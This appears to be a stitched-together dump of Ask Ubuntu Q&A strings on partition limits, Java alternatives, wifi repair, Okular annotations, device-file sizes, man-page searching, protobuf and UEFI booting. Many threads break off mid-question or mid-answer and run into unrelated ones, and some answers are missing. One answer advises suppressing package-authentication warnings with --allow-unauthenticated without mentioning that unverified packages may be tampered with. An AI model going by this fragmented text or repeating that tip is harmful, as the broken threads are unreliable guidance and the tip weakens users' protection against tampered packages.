have never had trouble reading partitions with gpart, Partition Wizard and usually can mount partitions with occasional issues when permissions conflict. Some of my partitions are encrypted by one of my many Linux OS's and some are unencrypted.\nMy addiction to lots and lotsa partitions entered a new phase when I discovered that, as Rod Smith points out, Ubuntu spreads its boot and boot configuration files for Grub over two partitions. I had a problem getting my 'untu installs to show on the boot screen and discovered that it is easy to get grub to update via the recovery mode log in when I tried out installs with root, boot and home partitions rather than the more typical two-partition install.\nThus, with an average of three OS's per laptop, and an interest in going to a quad-boot, that would leave me with around 14 partitions counting the Windows Recovery partitions and my own boot partition backup.\nI did have a problem with an Ubuntu-based distro(Mint) which, after some updates, could no longer read an encrypted drive. I had to reinstall and that issue leaves me wondering if, as i proceed with various updates, if Ubuntu might not be able to guarantee its performance with a very unusually complex network of partitions.\nMy question is whether I am courting disaster. Is there a signifgant risk that at some point my disc controller or some other system function will simply crash and burn when and if I add one too many small partitions? And, for that matter, is there some sort of major performance penalty I pay? So far so good, but I would heed the advice of those with different experience.\n\nA: No, your controller and other hardware do not care how many partitions you have, there is no reason for your  specific concern.\n\nA: As has been stated in some comments, there is no hardware issue with the number of partitions; disk controllers and disks deal in sector numbers, and neither know nor care what data is on those sectors or to which partition the sector is allocated. AFAIK, OS-level disk caches are also not a concern.\nThe old Master Boot Record (MBR) partitioning system is limited to four primary partitions, one of which can be an extended partition that can hold an arbitrary number of logical partitions. Note that the MBR limit sometimes creates problems because a disk might already have four primaries, which makes creating additional partitions difficult. This isn't really the point of your question, though. The newer GUID Partition Table (GPT) defaults to a limit of 128 partitions; however, this limit can be raised if necessary (few tools enable such a change, but gdisk can do it).\nThe MBR and GPT limits are based in the data structures themselves. OSes and disk utilities may impose lower limits. IIRC, recent versions of Windows have no set limit, although the usual mapping of drives to letters in the Roman alphabet, starting with C:, means you can map no more than 24 filesystems in this way. (I think older versions of Windows had a lower limit -- probably 16 or 24 -- but I don't recall the details.) There was originally a limit of, IIRC, 16 partitions in the Linux kernel; however, modern distributions, including Ubuntu, provide ways around that limit, with the workarounds activated by default. I have created, as a test, both MBR and GPT disks with vastly more than 16 partitions -- around 100, IIRC. The Linux distributions I used for this (Gentoo and Ubuntu, IIRC) handled these disks just fine. I never tried these disks in Windows, so I don't know how it would react. Ditto for FreeBSD and other OSes. If you're booting in EFI mode, or even with a computer that uses EFI firmware, you should also consider how it would react, which is something I've never tested. It's conceivable that an EFI might flake out and hang if fed a disk with a hundred partitions. This reaction might vary from one EFI to another, too, so even if you hear of either a success or a failure, that result might not apply to your computer.\nIn sum, you should be safe with up to about 16 partitions under any circumstances. If you want to go beyond that limit, you may want to test using a USB flash drive or a spare hard disk, to be sure your firmware and all your OSes can handle it.\n", "Q: Unable to install jdk1.8.0_65 on Ubuntu 14.04 I've created the /usr/lib/java directory and moved the jdk directory in it.\nbut while using the following commands, i'm not getting any output(not even an error):\nsudo update-alternatives --install \"/usr/bin/java\" \"java\" \"/usr/lib/java/jdk1.8.0_65/bin/java\" 1\n\nsudo update-alternatives --install \"/usr/bin/javac\" \"javac\" \"/usr/lib/java/jdk1.8.0_65/bin/javac\" 1\n\nsudo update-alternatives --install \"/usr/bin/javaws\" \"javaws\" \"/usr/lib/java/jdk1.8.0_65/bin/javaws\" 1\n\nI rather continued the further process and updated the JAVA_HOME in ~/.bashrc file.

You can use it remap user ID and groups but it still needs to be the same file system. That is what is used on the partition itself not something you set when you use \"mount\". \n", "Q: Issue while dual Booting Windows 7 Ultimate with Ubuntu 14.04.3 I am trying to dual boot my laptop which has Windows 7 Ultimate currently installed [ Not Licensed].

I dont want to start \"from scratch\" everytime I boot Ubuntu from that USB. I decided to make a persistent USB flash. My question is: Can I still use flash memory for storing data and moving it from computer to computer without making Ubuntu corrupted or something like that? So my flash memory is 16GB and I make persistent 4GB, I can use normally other 12GBs.\n\nA: The first partition on a Persistent flash drive is FAT32, it is the only partition visible to Windows.\nYou can access data on this partition while the drive is plugged into a Windows computer.\nIf you need to access data stored on this partition while booted from the flash drive, you can find it at filesystem/cdrom.\nEdit\nIf a Full install is what you want:\nStart by formatting your flash drive as NTFS if it is large, otherwise leave as FAT32.\nWhen you get to partitioning select \"Something else\".\nLeave the space desired for the first partition as FAT32 or NTFS, this is your Windows/Linux data partition.\nMake the remaining space ext4 and use for \"/\" (with a little space for swap if you want to allow hibernation).\nMake sure the boot loader is installed to the root of the USB drive.\nContinue with install.\nFinished drive will have a partition accessible to Windows and Linux (and OSX if FAT32). \nEdit: \nWindows 10 can see FAT and NTFS partitions regardless of partition order.\n\nA: I engaged the exact procedure that you propose without incident.\nAs I recall, I was able to do this with PNY, SanDisk and Cruzer.\nHowever, in the process of using several USB flashdrives for perhaps a dozen installs, some of which were reinstalls, I encountered mixed performace from various USB sticks.Some of them have been retired as unusable, but when they burnt out the cause was not as far as I have been able to ascertain, related to mixed usage.\nThus, while it is perfectly possible to go ahead and use a flash drive for both Live session boot-up of Ubuntu AND also for data storage, there is always the prospect that you may either lose data or overwrite or otherwise corrupt one of the boot up files or data files. Back up, back up and backup.\nIn my practice, I finally broke down and started using Live DVD's for installs so that I could use the flashdrives uncluttered. An added advantage is that I always know exactly which ISO and which burn I used for the install. It is written right there on the DVD that this ISO was installed on that computer on such and such a date. With the USB's, it is more difficult to keep track of which ISO was installed on which computer, although it is of course still possible. \nAdditional information which MIGHT be pertinent to further questions should you encounter problems would be:\n\n\n*\n\n*brand and model of the particular flash drives\n\n*capacity, especially as older smaller USB's may be more prone to glitches, perhaps\n\n*the manner in which the flashdrive is formatted, eg. FAT32, ntfs,etc. and perhaps how it was formatted (quick format on windows vs. slow format, format via Ubuntu, etc.)\n\n*whether it is USB 2.x or USB 3.x\n\n*whether the \"data files\" include executables or linux files\n\n*whether there are executables such as U3 which might interfere since they attempt to interject themselves between the USB partitions and the user\n\n*whether or not you have permitted Windows USB-repair to run, which IMVVHO may be unwise lgiven that MS is widely suspected of injecting Linux-averse obstacles into situations in which there is no other clear basis\n\n*which installation process you use to create the USB stick, eg. UNetbootin,  YUMI,etc.\nAll of these variables may affect your outcome, and you may wish to take note of remarks from other users who express better luck with some USB brands than others.USB flashdrives have a limited burn time.

I have a bunch of .mp4 files (DRM free). Each file comprises two episodes of a kids TV show. I would like to simply split the file in two without re-encoding. What's the best way to do this? Preferably with a GUI (as I need to skip to the correct part of each file to find the divider between the two episodes).\nThanks,\n\nA: I recommend opening the video in a media player to find the time where you want to split it.

Everything was working fine until yesterday morning after login I couldn't get the  wifi in ubuntu stopped to work (see details below) the windows part seems to work just fine. I would like to restore the wifi in ubuntu. \nSome Background:\nThe last time everything was fine, I was trying to (unsuccessfully) install haskell-platform in ubuntu (see  here ). I followed the advice  here  and downgraded my libgl1-mesa-glx package. As a result some brutal changes took place and I had to reinstall Xorg and Desktop-Environment. The problem with network manager started after that so I am guessing this was the source. \nAs mentioned before, I can access wifi via Windows. I can also access wifi by using a live ubuntu-usb. So, I can install packages to my hdd-ubuntu distribution. This makes me believe that there is no hardware problem and somehow I have deleted some essential packages. \nI am a noob in networking issues so most of what I have done (outlined below)  is based on my very limited (and perhaps wacky) understanding and reading through many threads on this site and elsewhere. So it is entirely possible that I have missed something trivial. \n What I did \nI purged and then reinstalled the packages network-manager, resolvconf; isc-dhcp-client and isc-dhcp-server packages couple of times.\nThis doesn't seem to solve the problem.\n My ifconfig -a reads: \n\n\neth0      Link encap:Ethernet  HWaddr 78:45:c4:b6:b4:85\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n          Interrupt:17 \n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:27488 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:27488 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2028140 (2.0 MB)  TX bytes:2028140 (2.0 MB)\n\nvirbr0    Link encap:Ethernet  HWaddr 3e:e3:92:b9:ab:c6\n          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n\nwlan0     Link encap:Ethernet  HWaddr 08:3e:8e:04:2f:9f\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n\n\n lshw -C shows \n \n\n*-network\n       description: Wireless interface\n       product: AR9485 Wireless Network Adapter\n       vendor: Qualcomm Atheros\n       physical id: 0\n       bus info: pci@0000:07:00.0\n       logical name: wlan0\n       version: 01\n       serial: 08:3e:8e:04:2f:9f\n       width: 64 bits\n       clock: 33MHz\n       capabilities: pm msi pciexpress bus_master cap_list rom ethernet physical wireless\n       configuration: broadcast=yes driver=ath9k driverversion=3.13.0-77-generic firmware=N/A latency=0 link=no multicast=yes wireless=IEEE 802.11bgn\n       resources: irq:19 memory:f7d00000-f7d7ffff memory:f7d80000-f7d8ffff\n  *-network\n       description: Ethernet interface\n       product: AR8162 Fast Ethernet\n       vendor: Qualcomm Atheros\n       physical id: 0\n       bus info: pci@0000:09:00.0\n       logical name: eth0\n       version: 10\n       serial: 78:45:c4:b6:b4:85\n       capacity: 100Mbit/s\n       width: 64 bits\n       clock: 33MHz\n       capabilities: pm pciexpress msi msix bus_master cap_list ethernet physical tp 10bt 10bt-fd 100bt 100bt-fd autonegotiation\n       configuration: autonegotiation=on broadcast=yes driver=alx latency=0 link=no multicast=yes port=twisted pair\n       resources: irq:47 memory:f7c00000-f7c3ffff ioport:e000(size=128)\n\n\n\nSome other configuration files that I checked were :/etc/network/interfaces which reads \n\n\nauto lo\niface lo inet loopback\n\n\n I added and then commented out #auto eth0, #iface eth0 inet dhcp, #auto wlan0, #iface wlan0 inet dhcp because it didn't solve the problem and just started the message waiting for network configuration when booting into ubuntu.  \nMy /etc/resolv.conf reads \n\n\n#Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\nnameserver 127.0.1.1\nnameserver 8.8.8.8\n\n\nMy /etc/hosts reads\n \n\n127.0.0.1 localhost\n127.0.1.1 my-comp\n#The following lines are desirable for IPv6 capable hosts\n::1 ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n\nand my /etc/NetworkManager/NetworkManager.conf reads\n \n\n[main]\nplugins=ifupdown,keyfile,ofono\ndns=dnsmasq\n\n[ifupdown]\nmanaged=false\n\n\nMy iwconfig outputs:\n\nwlan0     IEEE 802.11bgn  ESSID:off/any\n          Mode:Managed  Access Point: Not-Associated   Tx-Power=16 dBm\n          Retry  long limit:7   RTS thr:off   Fragment thr:off\n          Power Management:off\n\nIf tried `sudo ifdown wlan0' and 'sudo ifup wlan0' and didn't get any output which makes me think they are ok. \nI am looking for any directions that I might take to solve the problem.

This AP is a camera with images that need to be downloaded so the very second the server connects to this particular AP, I need it to run the download script (which I have already written).\nI know I could do some very dirty polling but is there anything like the udev bridge in systemd? All my searching is bringing up very general networking stuff that doesn't quite apply. It's the scripting side of things that is key here.\nSeconds after posting this it occurs that it doesn't have to be systemd if we have to do this just via network-manager (which is managing the wifi connection) then so be it...

In my case it works fine if I check $CONNECTION_ID against my SSID, but I'm not sure what would happen if this happened to match the name of another wired connection profile).\n", "Q: How to find ip address for the apache2 server on ubuntu? I have downloaded ubuntu on virtualbox , and I installed apache2 on it \n,i did configured the server and it works on \"localhost\" \n,the problem is that i need the ip address of the server\n,the command 'ifconfig' gives private ip address , how can I find the local ip for the server ?\nplease help me :( !!\n\nA: You get you local IP of the currently used network card (the one used inside your local LAN network, assigned by your router) using the following command:\nip route get 1 | awk '{print $NF; exit}'\n\nThis command prints both IPv4 and IPv6 address of the currently active interface:\nhostname -I\n\nIf you prefer a simple command, but are ok with reading through a bit of text to locate the information, check out one of the commands below. They print all available network interfaces by default, but you can also specify one by adding its name as additional argument to each of them.\nifconfig\nip addr show\n\n\nYou get your public IP (the one with which you're connected to the internet) using the command:\ncurl ifconfig.me\n\nOr visit the site http://ifconfig.me/ in your browser to see your IP address and further information, and to learn more command-line options.\n\nA: If you would like to access your APACHE from your local network (from network the machine running virtualbox is connected to) you can set the network configuration of the virtual instance to 'Bridged Adapter'. Doing this, your virtual machine will use the selected physical network card of your host. Having this in place the virtual instance can easily get an IP from your router via DHCP. And then you can look-up the address assignment in the virtual machine or in the lease list on the router.\n", "Q: Auto-Saving in Okular - is it possible? Is there a way of auto-saving annotations and highlights in Okular 0.19.3?\nEvery time I make a change, I got to Ctrl+Shift+S to save it, and sometimes I forget it, I close the window and the software doesn't show a reminder window (as some others do in Windows).\nIs there a way to configure it to auto-save, then? \n\nA: Autosave is not possible without chaging the source code i.e graphically . Officially Okular has not provided this. check this out: \nhttps://docs.kde.org/trunk5/en/kdegraphics/okular/okular.pdf\nWhen adding an annotation to a pdf file, \nAnnotations are saved internally by Okular.\nYou can export the annotated document using File -> Export As -> Document Archive\nSo if we close the file, and open it again in Okular, we can still see our annotations added last time. But if we open the file in another application , we can't see the annotations we added in Okular. This may be because it is .okular extension!\nBut sometimes it doesn't save automatically.Don't know why! \nFor other formats (and PDF itself), there's still the option to export annotatated documents in .okular format (File -> Export As -> Document Archive) and share them with other Okular users.\nActually, automatic internal storage is disabled in some cases, and you need to save to PDF every time you make a change. But there are warnings and a \"Save or discard changes?\" prompt in place for that.\nThe library we use to deal with PDF files, doesn't support modifying encrypted PDF files yet. If you open such a file, the \"Save As\" menu entry is grayed out and you are warned that you can only export as .okular file.\n\nA: It can be achieved by pushing ctrl+s \"smartly\".

Depending on the filetype, the output string for long option -l will be build up differently. GNU documentation fails to mention the format difference(see side note about OpenBSD man page).\nDevice files and ls source code\n/dev/sda is a block device (explained later in the section). It's different from regular file. ls.c builds up the long output string according to what filetype it is working on. As is shown below, for block devices nothing about size is appended to the output string !\nls.c has the following lines of code: \n   3757 static void\n   3758 print_long_format (const struct fileinfo *f)\n   3759 {\n\n( partially omited )\n\n   3868   if (f->stat_ok\n   3869       && (S_ISCHR (f->stat.st_mode) || S_ISBLK (f->stat.st_mode)))\n   3870     {\n   3871       char majorbuf[INT_BUFSIZE_BOUND (uintmax_t)];\n   3872       char minorbuf[INT_BUFSIZE_BOUND (uintmax_t)];\n   3873       int blanks_width = (file_size_width\n   3874                           - (major_device_number_width + 2\n   3875                              + minor_device_number_width));\n   3876       sprintf (p, \"%*s, %*s \",\n   3877                major_device_number_width + MAX (0, blanks_width),\n   3878                umaxtostr (major (f->stat.st_rdev), majorbuf),\n   3879                minor_device_number_width,\n   3880                umaxtostr (minor (f->stat.st_rdev), minorbuf));\n   3881       p += file_size_width + 1;\n   3882     }\n   3883   else\n   3884     {\n   3885       char hbuf[LONGEST_HUMAN_READABLE + 1];\n   3886       char const *size =\n   3887         (! f->stat_ok\n   3888          ? \"?\"\n   3889          : human_readable (unsigned_file_size (f->stat.st_size),\n   3890                            hbuf, file_human_output_opts, 1,\n   3891                            file_output_block_size));\n   3892       int pad;\n   3893       for (pad = file_size_width - mbswidth (size, 0); 0 < pad; pad--)\n   3894         *p++ = ' ';\n   3895       while ((*p++ = *size++))\n   3896         continue;\n   3897       p[-1] = ' ';\n   3898     }\n\nNotice that if filetype is S_ISCHR (character device, continuous stream of data) or  S_ISBLK (block device, random access) the major and minor device numbers are printed to character array p (which is essentially a string). That is the only data that is appended to the output string p . However, when we get to else part , ls understands that we're working with files other than block or character devices. For those files it assigns data stored in size array to the next segments of that p size array ( that's while ((*p++ = *size++)) part).\nThe core idea is that ls knows what filetype it's looking at , and builds up output accordingly\nWhat are device files anyway?\nEssentially they are references. They are way for applications to deal with actual physical devices and their drivers. For example , /dev/sda and /dev/sr0 (which is CD/DVD drive). Some of the devices are just abstraction. For example, /dev/zero, /dev/null, and /dev/random aren't physical devices. They are ways of interfacing with kernel processes.\nSince they are references, it makes sense that they wouldn't have filesize. It's possible to know the size of those files that they take up in the /dev directory, but they don't correspond to the actual devices they represent !\nThus it is understandable why ls.c developers implemented the code that way. The file size of the references is 99.99% of the times not needed for any reason whatsoever. \nBut block devices, by which we typically mean hard drives and USB drives, are physical devices, with real physical size, so how do we find out that ?\nFinding out the size of actual block devices\nThe bellow methods illustrate how one could find out size of a hard/ssd/USB drive referenced by a block device in `/dev/\n\n\n*\n\n*lsblk or lsblk /dev/sda\n\n*sudo blockdev --getsize64 /dev/sda\n\n*sudo fdisk -l /dev/sda or sudo fdisk -l for all devs\n\n*sudo parted /dev/sda print or sudo parted -l for all devs\n\n*awk '{print $1*512}' /sys/class/block/sda/size \n\n*awk  '{$3=$3*1024;print}' /proc/partitions or awk  '$4 == \"sda1\" {$3=$3*1024;print}' /proc/partitions for specific partitions.\n\n\nSide notes\n\n\n*\n\n*/proc/devices contains list of all major numbers corresponding to the block devices\n\n*du, stat and find commands can show you the size of those references, but not necessary for daily life (if at all)\n\n*There is difference between representation of block devices; some files implement representation blocks of 512 (such as under /sys filesystem), while others - 1024. This is a convention in the Unix/Linux world, since that's how actual physical blocks on hard drives are allocated.\n\n*Unlike GNU ls documentation, OpenBSD man page explicitly states: \"If the file is a character special or block special file, the major and minor device numbers for the file are displayed in the size field.\" (emphasis added by me)\n\n\nReferences\n\n\n*\n\n*Understanding /dev and its subdirs and files\n\n*Determine the size of a block device\n\n*Understanding /dev\n\n*Difference between Device file and device drivers\n\n*Wikipedia:Device file\n\n*Linux Kernel, Chapter 8\n\nA: It seems you missed the concept of 'everything-is-a-file'.\nIn the world of UNIX everything (data, devices, sockets, ..) is mapped to a file. Those files have types - in the case of your home directory you will (mostly) find so called regular files (text, programs,...).\nIn contrast to these regular files the /dev-directory holds - implied by the name - device files. Therefore you will find files of type character, block and pipe representing devices, eg. /dev/mem is a file that represents your systems memory, /dev/ttyACM0 can be a serial modem. The link between these (device-)files and the responsible drivers is created using the major and minor numbers as shown by ls (and as explained above). \nThe size of a device is a device specific attribute and must be queried using device specific tools (as shown in the post above) cause there is no unique way to deal with that attribute (a SSD may have a fixed size - but a serial port can deliver an endless stream of data so there is no fixed size, /dev/null has endless storage :)).\nYou can read on here: https://en.wikipedia.org/wiki/Everything_is_a_file\n", "Q: Ubuntu is not installing on Virtual box with error of not enough space while I do have the space I have followed all the steps to install Ubuntu on the VirtualBox but the installer puts a cross in front of the requirement \"free space of more than 6.6GB\" while I have around 7.5 Gb free space on my C drive. Please help.\n\nA: You created a virtual drive that is less than 6.6GB.\nIt does not matter how much space you have \"on your C drive\", because the virtual machine sees only the virtual drive.\nWhen you create a virtual machine you are asked to specify the amount of space you assign to the virtual disk. But in your case you may run out of disk space.\n\nA: Even on limited or in your case very limited hard drive space VirtualBox allows creating virtual drives of up to 2 TB virtual size. This does not depend on the physical space we have as long as it is a dynamically allocated file.\nBy this we can create a virtual drive much bigger than physical space available. This has the advantage to later move this drive to another location where we may have fewer hardware limits. But we will get an error with possible data loss as soon as we try to grow this disk to more than physically possible.\nTo further save hard drive space consider installing Ubuntu without a swap.\n", "Q: Mount my OSX Partition manually and read only I've recently installed Ubuntu 15.10 on a partition of a Macbook Pro.

I downloaded a compressed file (rar) with two files inside:\n1) A PDF standard file, and\n2) A hidden file  .fuse_hidden000004a90000000c (a dot, not extension, file name), which is the exact same PDF file.\nWell, I tried to remove (erase) the hidden file and...

Nothing!\nHere is the \"infamous\" file, and I can't remove it!\nEach time I type: dir, there is nothing.\nBut, when I type: ls -a, then I can see the hidden file!\nWhat can I do?\n\nA: This is not a permission problem. It seems you deleted the PDF while the file is still in use by some application. In this case (on fuse-based file systems), the file is deleted and a .fuse_hidden-file is created and kept as long as someone is using the file (there is at least one open file descriptor referencing the file). This mimics the common concept of delayed deletion (you can delete an open file, it will disappear from the file system listing and is finally deleted as soon as the file is closed).\nClose the application that shows the PDF. The file will definitely disappear after a reboot.\nOne comment to the chmod-command: a implies ugo.  \n", "Q: Packages cannot be authenticated Anytime I install a new package i get the following error:\nWARNING: The following packages cannot be authenticated!\n\nI can still install the package despite this error, but is there a way to get rid of it?\n\nA: As you clearly mentioned that you dont want to see that error in future , you can use  --allow-unauthenticated flag.\n\n--allow-unauthenticated\n       Ignore if packages can't be authenticated and don't prompt about\n       it.

I would not like to use \"pip install protobuf\" as it installs version 2.6, and I need 3. \n\nA: The protobuf library and protoc are 2 different things completely.\nprotoc (called \"protobuf-compiler\" by apt-get) is an executable that takes .proto files and generates code in the chosen language.\nMeanwhile, a protobuf library, like most libraries, contains code for you to reference in your own code - or in this case, code that is referenced by the generated code that protoc outputs.\nThe protobuf library for python (called \"python-protobuf\" by apt-get) can be easily updated to v3+ using this command:\nsudo pip install --upgrade protobuf\n\nI know of no better way to check the version of your protobuf library for python than this:\npython -c \"import google.protobuf; print google.protobuf.__version__\"\n\nprotoc, on the other hand, is significantly harder to update to v3+.\nLuckily, you basically only need to update it if you want to use v3 syntax in your .proto definitions.\nIf you decide to, you should only ever update protoc by downloading source code or binaries from https://github.com/google/protobuf as described in their README.\n", "Q: target filesystem doesn't have requested /sbin/init. /bin/sh: 0 : Can't open splash - Ubuntu 15.04 I have an Ubuntu 15.04 machine.

I guess the other option is to make my own grub UEFI partition but I have no clue how to do that.\nPlease help, it's my friends machine and I feel awful I've rendered his machine useless for the time being.\nThanks,\nDuff\n\nA: So it turns out that I wasn't using Unetbootin which meant I wasn't making proper USB bootable drives for use by a UEFI BIOS.\nIf you run into this issue, use Unetbootin to get the most stable live version (14.04 right meow) and plop it on a thumb drive. \nWhen you boot up the machine make sure it is in UEFI, No secure boot mode. Then in setup (F2) go to boot and add the BOOT/Grub2 to a boot option and put at high priority. \nSelect this, it will boot to Grub, from Grub run the installer for Ubuntu. Now that the installer is running on UEFI it should be a fine installation if you chose to wipe clean or partition.\nHope this helps someone.\n", "Q: Unable to Dual boot Ubuntu 15.10 with windows 10 I wasn't able to dual boot ubuntu 15.10 on my laptop Dell Inspiron 15 7000 series intel i5 processor,Nvidia Geforce GTX 960M 4GB, RAM 8GB, 256SSD.\nI have downloaded Ubuntu 15.10 and I have created a bootable USB.

Now I want to create another admin account(say Y) who can use all 50 software packages. \nIs this possible? How do I share the software packages installed on one user account with another? \n\nA: By default the Ubuntu package management installs all applications for all users.\nThis will not stop you from manually installing additional applications to a user's HOME directory. In this case you will have to copy this installation over to the other user's HOME.\nMost applications will store user defined settings in a user's HOME. Most but depending on the application not all setting may also just be copied over to a new account to make them identical.\nA special case are virtual machine's hard drives or Wine bottles that will be stored in a user's HOME by default. To use these from all accounts we can either make a copy resp. clone them to the other account, or we make sure we store these in a shared directory accessible to multiple users.\n", "Q: how to add kernel level routing? In my Ubuntu server I have 5 NICs for five different subnet. There are some default kernel level routing which needs to be modified. The problem is NIC's ip and destination network is different. \nFor instance one NIC ip is 10.172.89.2 and this NIC is supposed to transmit traffic to 10.214.7.35. If I try adding route like: \nroute add -network 10.214.7.35 mask 255.255.255.255 gw 10.172.89.2 dev eth0 \n\nthen kernel does not accept this route saying destination network unreachable. Can anyone help giving idea please?\n\nA: You need to use -host because your giving an network with netmask for only one host. Also I think the syntax is -network 10.214.7.35/32. Also I recommend to do it with the ip command, route is a bit rusty.\n", "Q: ubuntu shuts down after exact 5 hours I have an Ubuntu 14.04 with Kernel 4.2.0-25-generic.\nMy hardware:\nasrock q1900m\nnvidia geforce 510\nDigital Devices Cine S2\nI use the ubuntu for vdr and xbmc.\nThe Problem is that the pc shuts down after exact 5 hours (and 2 seconds):\nJan 30 08:13:02 privat-leo-receiver rsyslogd: [origin software=\"rsyslogd\" swVersion=\"7.4.4\" x-pid=\"696\" x-info=\"http://www.rsyslog.com\"] start\nJan 30 13:13:04 privat-leo-receiver rsyslogd: [origin software=\"rsyslogd\" swVersion=\"7.4.4\" x-pid=\"696\" x-info=\"http://www.rsyslog.com\"] exiting on signal 15.\nJan 30 15:24:20 privat-leo-receiver rsyslogd: [origin software=\"rsyslogd\" swVersion=\"7.4.4\" x-pid=\"642\" x-info=\"http://www.rsyslog.com\"] start\nJan 30 20:24:22 privat-leo-receiver rsyslogd: [origin software=\"rsyslogd\" swVersion=\"7.4.4\" x-pid=\"642\" x-info=\"http://www.rsyslog.com\"] exiting on signal 15.\n\nI monitor the temp of the CPU and the motherboard so its not an overheating problem.\nI tried to update the nvidia driver to nvidia-352, because I found an thread at a forum that this could be the solution, but it still occurs...\nWhile the 5 fours I let xbmc play an serie in an loop, I will try now with just idle.\nAnyone an idea how to solve this?\n\nA: I found the problem.

I'm using Ubuntu 15.10.\n\nA: I'm answering my own question here, in case someone else stumbles into the same problem. As it turns out, Contacts were disabled in Online Accounts, but it took me a while to figure it out because Empathy must be closed when you change this configuration. Empathy apparently doesn't notice on the fly that you changed the online accounts.

Basically a while ago I got hacked and needed to completely reinstall ubuntu server. I managed to save most of my data, but for some reason wasn't able to copy my home Maildir.

I want to learn how to search for a file by giving the content within it as a parameter. I can then apply the solution to search for commands contributed by Richard Stallman (through man pages).\n\nA: This method does not search the entire manpages for a keyword, but only each manpage's title and short description. It will not be enough in your case, but useful to quickly look up something. If it does not return the desired results, you have to use @philsf's answer.\nYou can use the apropos command to quickly search all installed manpages' title and description for a keyword:\n$ apropos chat\nchat (8)             - Automated conversational script with a modem\nchattr (1)           - change file attributes on a Linux file system\nempathy (1)          - GNOME multi-protocol chat and call client\n\nYou can display a known manpage's description using whatis:\n$ whatis empathy\nempathy (1)          - GNOME multi-protocol chat and call client\n\nAs I said, this method will not search the entire manpage body, therefore apropos Stallman returns nothing... \n\nA: From man man:\n-K, --global-apropos\n      Search for text in all manual  pages.   This  is  a  brute-force\n      search,  and is likely to take some time; if you can, you should\n      specify a section to reduce the number of pages that need to  be\n      searched.   Search terms may be simple strings (the default), or\n      regular expressions if the --regex option is used.\n\n-w, --where, --location\n      Don't actually display  the  manual  pages,  but  do  print  the\n      location(s) of the source nroff files that would be formatted.\n\nCombined:\nman -wK 'Richard M Stllman'\n\nThough manpages typically have just Richard Stallman, with a variable amount of space between the two words, so a regex might be appropriate:\n--regex\n      Show all pages with any part of  either  their  names  or  their\n      descriptions   matching   each   page   argument  as  a  regular\n      expression, as with  apropos(1).   Since  there  is  usually  no\n      reasonable  way  to  pick  a  \"best\"  page  when searching for a\n      regular expression, this option implies -a.\n\nSo:\nman --regex -wK 'Richard *Stallman' \n\n\nA: This command will show you the filenames of man files that contain the keyword Stallman:\nzgrep -l Stallman /usr/share/man/man?/*\n\nOutput in my 15.10 begins with:\n/usr/share/man/man1/cat.1.gz\n/usr/share/man/man1/comm.1.gz\n/usr/share/man/man1/ctags.1.gz\n/usr/share/man/man1/ctags.emacs24.1.gz\n\nThen, you can browse as usual, with man cat, man comm, etc.\n", "Q: Is it possible to integrate rabbitvcs with a file manager krusader Krusader?

You should use forward slashes / instead of \\. And also /Users/foo/bar is really unusual (it seems like you are on OSX). Your home dir on linux is in /home/[your username] and the path proposed by ssh-keygen tells us that your username is vagrant. So store your key somewhere in /home/vagrant.

I can solve this problem page-per-page by importing the pages to inkscape, selecting all paths, clicking on \"Black\", which converts all colours including the greytones to pure black, and exporting back to PDF.\nIs there a way to do these steps in inkscape in the command line (for batch processing)?\nIs there a way to achieve the same result (convert pdf to black and white, 1-bit greyscale) without inkscape?\n\nEdit. There are similar questions on Unix.SE and on superuser, which use Ghostscript. However, these only convert the files to greyscale via the option  -sColorConversionStrategy=Gray. The option -sColorConversionStrategy=/Mono results in the error Unrecoverable error: rangecheck in .putdeviceprops.

Pressing and/or holding shift, or F1 or ctl+alt+F1 does not do anything during the boot process.\nI do not and never have had a Grub menu on startup while using rEFInd...I am new  with Ubuntu so didn't realize I was supposed to have this screen. \nHowever, I checked under my sub options for Ubuntu in rEFInd and I have 4 options:\nBoot with normal options\nBoot into single user mode\nvmlinuz-4.2.0-16-generic.efi.signed: Boot with normal options\nvmlinuz-4.2.0-16-generic.efi.signed: Boot into single user mode\nUsing vmlinuz-4.2.0-16-generic.efi.signed: Boot with normal options, I can boot into Ubuntu fine. But I have no idea what exactly this option is? It has all the same settings and preferences I had in my normal Ubuntu. So what happened? Do I just boot into this sub option every time I want to boot Ubuntu? and I still have no control over my brightness. My apologies if this encompasses many subtopics in one. Maybe I need to totally start over with my Ubuntu partition and get a Grub screen so in case something like this happens again. I'm not sure where to go from here.\nEdit I used boot-repair and now have Grub. Booting Ubuntu now gives me a brief purple screen, flashes Ubuntu, flashes 5 red dots and goes to black screen. Pressing e in Grub and changing \"quiet splash\" to \"nomodeset\" gives me a brief purple screen and then goes to black.\n\nA: First, GRUB is just one of several boot loaders for Linux. You can swap it out in favor of something else if you like; it is not required, although it is the default boot loader for Ubuntu. For EFI-based systems, see this page of mine, which describes several EFI-mode boot loaders, as well as related information. rEFInd is a boot manager, which means it shows boot options, but it is not technically a boot loader. The way you had been booting used rEFInd and the EFI stub boot loader, which enables the kernel to act as its own boot loader. This is a perfectly workable method of booting Ubuntu. In sum: Installing GRUB was unnecessary for you.\nSecond, the rEFInd sub-menu with the four options 